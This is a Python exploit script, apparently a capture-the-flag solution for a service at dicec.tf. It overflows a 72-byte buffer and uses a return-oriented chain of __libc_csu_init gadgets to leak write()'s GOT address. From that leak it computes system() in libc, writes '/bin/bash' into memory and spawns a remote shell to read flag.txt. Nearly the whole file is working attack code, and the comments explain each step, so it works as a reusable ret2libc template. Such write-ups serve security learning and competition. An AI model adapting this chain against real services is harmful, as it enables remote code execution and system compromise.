import socket
import struct
import time

# reference: https://bananamafia.dev/post/x64-rop-redpwn/


def p64(n):
    return struct.pack("<Q", n)


if __name__ == "__main__":
    url = "dicec.tf"
    port = 31924

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((url, port))
    sock.recv(2048) # "Your name: "


    rdi_gadget = p64(0x4011d3)
    # found with ROPgadget
    # pop rdi
    # ret

    pop_gadget = p64(0x4011ca)
    # part of __libc_csu_init()
    # pop rbx (needs to hold 0 for increment and comparison to rbp)
    # pop rbp (needs to hold 1 for comparison to rbx)
    # pop r12 (needs to hold 1 for stdout)
    # pop r13 (needs to hold address to write bytes from)
    # pop r14 (needs to hold number of bytes to write)
    # pop r15 (needs to hold pointer to write function)
    # ret

    call_gadget = p64(0x4011b0)
    # part of __libc_csu_init()
    # mov rdx, r14
    # mov rsi, r13
    # mov edi, r12d
    # call qword [r15 + rbx*8]

    # below addresses can be found with pwntools, radare2, etc.
    write_got = p64(0x404018)   # write() GOT address
    gets_sym = p64(0x401040)    # gets() symbol address
    main_sym = p64(0x401136)    # main() symbol address
    writeable = p64(0x404040)   # writeable address in GOT, found with radare2 "dm" command


    # first payload writes command string to GOT, leaks address of write(), then restarts at main() to allow second payload
    payload = b"A"*72       # overflow buffer up to rip                           
    payload += rdi_gadget   # pop rdi
    payload += writeable    # writeable address in GOT
    payload += gets_sym     # call gets() to populate GOT with command string
    payload += pop_gadget   # pops rbx, rbp, r12, r13, r14, r15
    payload += p64(0)       # rbx, needed for comparison check after "call qword"
    payload += p64(1)       # rbp, needed for comparison check after "call qword"
    payload += p64(1)       # r12, ends up in edi
    payload += write_got    # r13, ends up in rsi
    payload += p64(8)       # r14, ends up in rdx
    payload += write_got    # r15, pointer to write() that gets called by call_gadget
    payload += call_gadget  # print address of write()
    payload += p64(0)*7     # filler for pop instructions after "call qword"
    payload += main_sym     # restart execution at main
    payload += b"\n"

    sock.send(payload)

    # "/bin/sh" string from libc fails to spawn shell, have to write custom command string to memory
    # below string is written into GOT using gets() call in payload above
    sock.send(b"/bin/bash\x00\n") 

    time.sleep(0.2) # slight pause to prevent accidently terminating early
    address = sock.recv(2048)
    write_addr = int.from_bytes(address[:8], "little")

    # libc version and system() offset found using leaked addresses of write() and gets()
    # https://libc.blukat.me/?q=gets%3A7fd7535fdaf0%2Cwrite%3A7fd7536881d0&l=libc6_2.31-0ubuntu9.1_amd64
    system_addr = p64(write_addr - 0xbbdc0)


    # second payload calls system() address calculated above and passes it string previously written to GOT
    payload = b"A"*72       # overflow buffer up to rip                           
    payload += rdi_gadget   # pop rdi
    payload += writeable    # address of "/bin/bash" written to GOT
    payload += system_addr  # address of system()
    payload += b"\n"

    sock.send(payload)
    sock.send(b"cat flag.txt\n")
    time.sleep(0.2) # slight pause to prevent accidently terminating early
    print(sock.recv(2048).decode(), end="")
